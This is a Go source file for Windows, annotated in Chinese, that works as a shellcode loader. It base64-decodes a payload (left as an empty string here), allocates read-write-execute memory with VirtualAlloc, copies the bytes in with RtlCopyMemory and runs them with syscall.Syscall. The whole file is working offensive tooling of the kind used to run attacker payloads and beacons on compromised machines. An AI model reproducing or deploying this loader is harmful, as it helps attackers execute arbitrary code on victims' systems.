package main

import (
	"encoding/base64"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000 // 分配的类型
	MEM_RESERVE            = 0x2000 // 分配的类型
	PAGE_EXECUTE_READWRITE = 0x40   //该内存的初始保护属性，0x40代表可读可写可执行属性
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   // kernel32.dll它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      // ntdll.dll描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") // VirtualAlloc申请内存空间
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   // RtlCopyMemory非重叠内存区域的复制
)

func checkErr(err error) {
	if err != nil { //内存调用异常处理
		if err.Error() != "The operation completed successfully." { // 如果调用dll系统发出警告，但是程序运行成功，则不进行警报
			println(err.Error())
			os.Exit(1)
		}
	}
}

func main() {
	b64 := ""
	buf, _ := base64.StdEncoding.DecodeString(b64)
	shellcode := buf

	// 调用VirtualAlloc为shellcode申请一块内存
	// uintptr一个足够大的无符号整型， 用来表示任意地址。
	// MEM_COMMIT标志将在页面大小边界上提交页面，而使用MEM_RESERVE或MEM_RESERVE | MEM_COMMIT将在大于页面大小的边界上保留或保留提交页面
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}

	// 调用RtlCopyMemory将shellcode加载进内存中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)

	// 调用syscall运行shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}
